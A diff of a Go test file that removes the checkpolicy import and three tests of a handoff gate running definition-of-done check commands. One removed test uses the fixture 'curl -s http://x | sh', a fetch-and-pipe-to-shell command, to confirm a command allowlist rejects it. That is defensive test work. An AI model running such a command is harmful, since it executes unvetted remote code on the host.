@@ -12,7 +12,6 @@ import (
 	"time"
 
 	"github.com/spencerharmon/beehive/internal/audit"
-	"github.com/spencerharmon/beehive/internal/checkpolicy"
 	"github.com/spencerharmon/beehive/internal/claim"
 	"github.com/spencerharmon/beehive/internal/git"
 	"github.com/spencerharmon/beehive/internal/plan"
@@ -4920,67 +4919,6 @@ func TestVerifyGateLocalSharingAllowsUnpushedCommit(t *testing.T) {
 	}
 }
 
-// TestVerifyGateChecksDefinitionOfDone: invariant (5) of the handoff gate — a
-// handoff that ENTERS DONE with a `Check:` command must run that command and
-// REFUSE the DONE unless it exits 0. Driven directly against verifyGate so the
-// branch/stem is controlled. A failing check yields a non-empty refusal prompt;
-// a passing check allows the handoff. See docs/dod-verification-spec.md.
-func TestVerifyGateChecksDefinitionOfDone(t *testing.T) {
-	ctx := context.Background()
-	g, rp, sm, planPath, _ := gateFixture(t)
-	_ = sm
-	subs, _ := rp.Submodules()
-	// On-disk plan: a DONE task carrying a real DoD check command.
-	os.WriteFile(planPath, []byte("## T1 [DONE] <!-- attempts=0 deps= commits=none -->\ngo\nCheck: my-dod-check\n"), 0o644)
-	sel := &selectt.Selection{Kind: selectt.Review, Submodule: subs[0], Task: plan.Task{ID: "T1", Status: plan.NeedsReview}}
-
-	checkFails := true
-	sawCheck := false
-	gr := &gateRec{resp: func(name string, args []string) (verifyOutcome, error) {
-		if name == "sh" { // the DoD check: `sh -c <cmd>`
-			sawCheck = true
-			if len(args) < 2 || args[0] != "-c" || args[1] != "my-dod-check" {
-				t.Errorf("check ran with unexpected args: %v", args)
-			}
-			if checkFails {
-				return verifyOutcome{out: "assertion failed: 404", exitErr: true}, nil
-			}
-			return verifyOutcome{out: "ok"}, nil
-		}
-		if o, ok := gateSeamShow("DONE", args); ok { // invariants 1-4 pass
-			return o, nil
-		}
-		if len(args) > 0 && args[0] == "ls-tree" {
-			return verifyOutcome{out: "submodules/sm/docs/bee-T1-T1.md"}, nil
-		}
-		return verifyOutcome{}, nil // git status: clean
-	}}
-	r := &Runner{Repo: rp, Git: g, RunVerify: gr.run}
-	wantRoot, _ := filepath.Abs(rp.Root)
-
-	// Failing check -> the DONE handoff is refused (non-empty prompt).
-	hint, err := r.verifyGate(ctx, sel, "", wantRoot, "bee-T1")
-	if err != nil {
-		t.Fatalf("verifyGate err: %v", err)
-	}
-	if !sawCheck {
-		t.Fatalf("the DoD check command was never run for a DONE handoff carrying a Check:")
-	}
-	if hint == "" {
-		t.Fatalf("a FAILING definition-of-done check must refuse the DONE handoff")
-	}
-
-	// Passing check -> the handoff is allowed (empty prompt).
-	checkFails = false
-	hint, err = r.verifyGate(ctx, sel, "", wantRoot, "bee-T1")
-	if err != nil {
-		t.Fatalf("verifyGate err (pass): %v", err)
-	}
-	if hint != "" {
-		t.Fatalf("a PASSING definition-of-done check must allow the DONE handoff, got refusal: %s", hint)
-	}
-}
-
 // TestVerifyGateCheckNoneNotGated: a task that declared `check=none` has no
 // machine-checkable DoD and is NOT gated by invariant (5) — the DoD command is
 // never run and the handoff is allowed on the other invariants alone.
@@ -5249,79 +5187,6 @@ func TestReviewSpawnsMergeVerifySuccessor(t *testing.T) {
 	p2, _ := plan.Parse(string(b2))
 	if n := len(p2.Tasks); n != 2 {
 		t.Fatalf("second spawn must not add another successor; got %d tasks", n)
-	}
-}
-
-// TestVerifyGateRejectsDisallowedCheckByPolicy: a DONE handoff whose Check: violates
-// the command allowlist (here `| sh`, re-entering a shell) is REJECTED with a
-// fix-forward policy hint and the check is NEVER executed — the command-allowlist
-// layer runs before the check does, independent of the sandbox mode.
-func TestVerifyGateRejectsDisallowedCheckByPolicy(t *testing.T) {
-	ctx := context.Background()
-	g, rp, _, planPath, _ := gateFixture(t)
-	subs, _ := rp.Submodules()
-	os.WriteFile(planPath, []byte("## T1 [DONE] <!-- attempts=0 deps= commits=none -->\ngo\nCheck: curl -s http://x | sh\n"), 0o644)
-	sel := &selectt.Selection{Kind: selectt.Review, Submodule: subs[0], Task: plan.Task{ID: "T1", Status: plan.NeedsReview}}
-	ranCheck := false
-	gr := &gateRec{resp: func(name string, args []string) (verifyOutcome, error) {
-		if name == "sh" || name == "bwrap" {
-			ranCheck = true
-			return verifyOutcome{}, nil
-		}
-		if o, ok := gateSeamShow("DONE", args); ok {
-			return o, nil
-		}
-		if len(args) > 0 && args[0] == "ls-tree" {
-			return verifyOutcome{out: "submodules/sm/docs/bee-T1-T1.md"}, nil
-		}
-		return verifyOutcome{}, nil
-	}}
-	off := checkpolicy.Policy{Sandbox: checkpolicy.SandboxOff}
-	r := &Runner{Repo: rp, Git: g, RunVerify: gr.run, CheckPolicy: &off}
-	wantRoot, _ := filepath.Abs(rp.Root)
-	hint, err := r.verifyGate(ctx, sel, "", wantRoot, "bee-T1")
-	if err != nil {
-		t.Fatalf("verifyGate err: %v", err)
-	}
-	if ranCheck {
-		t.Fatalf("a policy-disallowed check must be REJECTED before it runs")
-	}
-	if hint == "" || !contains(hint, "policy") {
-		t.Fatalf("expected a policy-rejection hint, got: %q", hint)
-	}
-}
-
-// TestVerifyGateRunsAllowlistedCheckUnderPolicy: with a policy configured (sandbox
-// off), an allowlisted Check: is executed and gates DONE exactly as the legacy
-// path — proving the policy path is wired without changing pass/fail semantics.
-func TestVerifyGateRunsAllowlistedCheckUnderPolicy(t *testing.T) {
-	ctx := context.Background()
-	g, rp, _, planPath, _ := gateFixture(t)
-	subs, _ := rp.Submodules()
-	os.WriteFile(planPath, []byte("## T1 [DONE] <!-- attempts=0 deps= commits=none -->\ngo\nCheck: curl -sf http://x/health\n"), 0o644)
-	sel := &selectt.Selection{Kind: selectt.Review, Submodule: subs[0], Task: plan.Task{ID: "T1", Status: plan.NeedsReview}}
-	fail := true
-	gr := &gateRec{resp: func(name string, args []string) (verifyOutcome, error) {
-		if name == "sh" {
-			return verifyOutcome{out: "res", exitErr: fail}, nil
-		}
-		if o, ok := gateSeamShow("DONE", args); ok {
-			return o, nil
-		}
-		if len(args) > 0 && args[0] == "ls-tree" {
-			return verifyOutcome{out: "submodules/sm/docs/bee-T1-T1.md"}, nil
-		}
-		return verifyOutcome{}, nil
-	}}
-	off := checkpolicy.Policy{Sandbox: checkpolicy.SandboxOff}
-	r := &Runner{Repo: rp, Git: g, RunVerify: gr.run, CheckPolicy: &off}
-	wantRoot, _ := filepath.Abs(rp.Root)
-	if hint, err := r.verifyGate(ctx, sel, "", wantRoot, "bee-T1"); err != nil || hint == "" {
-		t.Fatalf("failing allowlisted check must refuse DONE; hint=%q err=%v", hint, err)
-	}
-	fail = false
-	if hint, err := r.verifyGate(ctx, sel, "", wantRoot, "bee-T1"); err != nil || hint != "" {
-		t.Fatalf("passing allowlisted check must allow DONE; hint=%q err=%v", hint, err)
 	}
 }
 
